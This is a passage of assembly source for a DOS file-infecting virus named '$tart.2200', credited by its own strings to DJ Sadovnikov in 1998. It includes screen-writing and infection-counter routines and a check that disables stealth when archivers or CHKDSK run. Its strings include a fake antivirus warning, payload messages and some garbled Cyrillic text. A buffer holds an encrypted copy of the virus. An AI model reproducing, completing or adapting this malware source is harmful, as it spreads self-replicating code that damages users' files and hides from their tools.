   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   SeekStr:    push    0B800h
           pop ds

           xor al, al
           xor si, si
           xor di, di
   Loop9:      mov ah, ds:[si]
           cmp ah, cs:[di+bx]
           je  Found
           xor di, di
   L7:     inc si
           inc si
           cmp si, 4002
           jne Loop9
           ret

   Found:      inc di
           cmp cs:[di+bx], byte ptr 0
           jne L7
           not al
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   WriteText:  push    0B800h          ; Writing text, addressed by BX,
           pop ds          ; into video memory, since cell,
   Loop10:     xor si, si          ; addressed by DI. The format of
   Loop11:     mov ah, cs:[bx]     ; text: to terminate string - 0,
           mov ds:[di], ah     ; to terminate message - one
           inc di          ; more 0.
           mov ds:[di], byte ptr 01001111b
           inc di
           inc bx
           inc si
           cmp cs:[bx], byte ptr 0
           jne Loop11
           shl si, 1           ; SI = SI*2.
           sub di, si
           add di, 160
           inc bx
           cmp cs:[bx], byte ptr 0
           jne Loop10
           ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   TestCount:  push    cs
           pop ds
           cmp ds:[Flag-Virus], byte ptr 80h
           jne L8
           inc word ptr ds:[Counter-Virus]
           cmp ds:[Counter-Virus], word ptr 501
           jne L8

           mov bx, Message-Virus
           mov di, 1484
           call    WriteText
           xor ax, ax          ; Waiting for key pressed.
           int 16h

   L8:     ret

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

   Compare:    mov cs:[StFlag-Virus], byte ptr 0
           mov si, dx
   L9:     inc si
           cmp ds:[si], byte ptr 0
           jne L9
   L10:        dec si
           cmp ds:[si-1], byte ptr '\'
           jne L10

           mov di, Programs-Virus
   L11:        mov bx, si
   L12:        mov ah, cs:[di]
           cmp ds:[bx], ah
           jne L14
           inc bx
           inc di
           cmp ds:[bx-1], byte ptr '.'
           jne L12
           not byte ptr cs:[StFlag-Virus]
   L13:        ret

   L14:        inc di
           cmp cs:[di], byte ptr 0
           je  L13
           cmp cs:[di-1], byte ptr '.'
           je  L11
           jmp L14





   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ*…*…Œ…**›…ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ;

   Programs    db  'CHKDSK.'   ; The list of programs at the executing
           db  'PKZIP.'    ; of which one is necessary to disable
           db  'ZIP.'      ; the stealth mechanism.
           db  'PKPAK.'
           db  'PAK.'
           db  'LHICE.'
           db  'ICE.'
           db  'BSARC.'
           db  'PACK.'
           db  'TAR.'
           db  'AIN.'
           db  'RAR.'
           db  'LHA.'
           db  'HA.'
           db  'ZOO.'
           db  'ARJ.'
           db  0

   Warning     db  'ÉÍÍ MS AntiVirial Monitor ÍÍ»',0
           db  'º WARNING: Int 21h tracing! º',0
           db  'º       System halted       º',0
           db  'ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼',0,0

   Birthday    db  ' Today DJ Sadovnikov celebrates his birthday! ',0,0

   Message     db  'ÉÍÍÍÍÍÍÍÍ $tart.2200 Virus ÍÍÍÍÍÍÍÍ»',0
           db  'º         *®§¤à ¢ìâ¥ ¬¥ï!         º',0
           db  'º Ÿ â®«ìª® çâ® § à §¨« 500-ë© ä ©« º',0
           db  'º *à¨¢¥â ãç è¨¬áï ª®¬¯«¥ªá  $â àâ! º',0
           db  'º     * ¦¬¨â¥ «î¡ãî ª« ¢¨èã...     º',0
           db  'ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼',0,0

   Copyright   db  'ÉÍ Your computer infected by Í»',0
           db  'º   Virus "$tart.2200" v1.0   º',0
           db  'º    (C) by DJ Sadovnikov     º',0
           db  'º      Moscow, Nov 1998       º',0
           db  'ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼',0,0

   Counter     dw  1       ; The counter of infected files


   EndCode:

      ; You may to place here a temporary variables, which don't need to be added
      ; to the file, but for which the allocation of memory is required.

   Date        dw  ?       ; The date of virus's installation
                       ; into the memory.
   Flag        db  ?
   Tmp     db  18h dup (?) ; For EXE-header storage.
   StFlag      db  ?
   Buffer      db  (EndCode-Virus) dup (?) ; Crypted copy of virus.

   EndVir:

   Code        ends
           end Virus
